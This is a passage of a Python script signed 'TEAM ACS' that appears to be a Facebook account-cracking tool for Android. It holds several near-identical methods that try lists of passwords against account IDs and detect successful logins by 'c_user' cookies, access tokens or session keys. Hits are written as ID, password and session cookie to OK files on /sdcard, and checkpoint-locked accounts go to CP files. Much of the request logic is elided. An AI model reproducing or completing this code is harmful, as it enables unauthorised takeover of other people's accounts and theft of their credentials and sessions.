...
#---------------------------| Logo |---------------------------#
logo=(f'''{white}        >> Code By T{green}E{white}A{green}M{white} ACS <<\n{white}───────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ACS-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ACS-RANDM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ACS-CP|> {idf} ● {pw} ")
				open('/sdcard/ACS-RANDN-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ACS-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ACS-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ACS-RANDM-M2-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ACS-CP|> {idf} ● {pw} ")
				open('/sdcard/ACS-RANDM-M2-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M3____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ACS-M3|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ACS-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ACS-RANDM-M3-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ACS-CP|> {idf} ● {pw} ")
				open('/sdcard/ACS -RANDN-M3-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M4____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ACS-M4|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ACS-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ACS-RANDM-M4-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ACS-CP|> {idf} ● {pw} ")
				open('/sdcard/ACS-RANDM-M4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M5____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ACS-M5|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ACS-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ACS-RANDM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|ACS-CP|> {idf} ● {pw} ")
				open('/sdcard/ACS-RANDM-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
...
def ____M6____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ACS-M6|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ACS-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ACS-RANDM-M6-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|ACS-CP|> {idf} ● {pw} ")
				open('/sdcard/ACS-RANDN-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|ACS-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|ACS-CP|> {uid} ● {ps}")
				open("/sdcard/ACS-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			elif "session_key" in po:
				print(f"\r\r{green}<|ACS-OK|> {uid} ● {ps}")
				open("/sdcard/ACS-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			else:pass
		loop+=1
